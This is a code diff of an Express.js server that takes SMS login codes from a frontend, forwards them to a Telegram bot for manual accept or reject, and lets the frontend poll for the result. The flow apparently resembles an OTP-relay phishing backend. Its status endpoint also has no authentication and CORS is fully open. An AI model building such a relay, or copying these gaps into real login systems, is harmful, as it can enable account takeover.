@@ -2,33 +2,44 @@ const express = require("express");
 const cors = require("cors");
 const bodyParser = require("body-parser");
 
+const { sendApprovalRequestSMS } = require("./bot"); // import your Telegram bot function
+
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// In-memory storage for demo purposes
+// In-memory storage
 const approvals = {}; // { code: "accepted" / "rejected" }
 
 app.use(cors());
 app.use(bodyParser.json());
 
-// Endpoint for Telegram bot to update approval status
+// 1️⃣ Receive code from frontend and send Telegram buttons
+app.post("/sms-login", (req, res) => {
+  const { code } = req.body;
+  if (!code) return res.status(400).json({ error: "Missing code" });
+
+  approvals[code] = "pending"; // initialize status
+  sendApprovalRequestSMS(code); // send Telegram buttons
+  res.json({ success: true });
+});
+
+// 2️⃣ Frontend polls this endpoint to check status
+app.get("/check-status", (req, res) => {
+  const code = req.query.code;
+  if (!code) return res.status(400).json({ error: "Missing code" });
+
+  const status = approvals[code] || "pending";
+  res.send(status); // returns "pending", "accepted", or "rejected"
+});
+
+// 3️⃣ Telegram bot updates status
 app.post("/update-status", (req, res) => {
   const { code, status } = req.body;
-
-  if (!code || !status) {
-    return res.status(400).json({ error: "Missing code or status" });
-  }
+  if (!code || !status) return res.status(400).json({ error: "Missing code or status" });
 
   approvals[code] = status;
   console.log(`✅ Code ${code} marked as ${status}`);
   res.json({ success: true });
-});
-
-// Optional endpoint to check current status (for testing)
-app.get("/status/:code", (req, res) => {
-  const code = req.params.code;
-  const status = approvals[code] || "pending";
-  res.json({ code, status });
 });
 
 // Health check
